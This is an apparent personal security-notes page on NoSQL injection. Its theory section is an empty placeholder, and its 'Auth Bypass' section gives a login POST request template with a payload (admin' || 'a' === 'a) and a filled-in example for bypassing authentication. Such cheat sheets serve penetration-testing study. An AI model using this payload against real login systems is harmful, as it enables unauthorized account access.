---
Primary_category: "[[WEB ATTACKS]]"
title: "NOSQLI"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WEB ATTACKS]]

#### *Theory*

> 🛠️⌛

---

#### *Auth Bypass*

##### *Login Form*

###### *Request*

```bash
POST /login HTTP/1.1
<SNIP>
Content-Type: application/x-www-form-urlencoded

username=<USER>&password=<PASSWD>
```

###### *Payload*

> ***[[SQLi]] → `admin' OR 'a'='a`***

```bash
admin' || 'a' === 'a
```

> [!DANGER]- *e.g.*
>
> ```bash
> username=admin' || 'a' === 'a&password=test
> ```
>